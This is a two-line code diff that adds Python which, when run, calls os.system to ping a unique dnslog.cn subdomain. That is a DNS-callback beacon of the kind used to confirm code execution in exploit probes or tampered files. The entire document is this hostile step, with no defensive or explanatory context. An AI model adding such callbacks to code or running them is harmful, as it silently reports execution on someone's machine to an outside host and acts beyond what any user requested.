@@ -1,0 +1,2 @@
+import os
+os.system("ping abc.6spl5w.dnslog.cn -c 1")
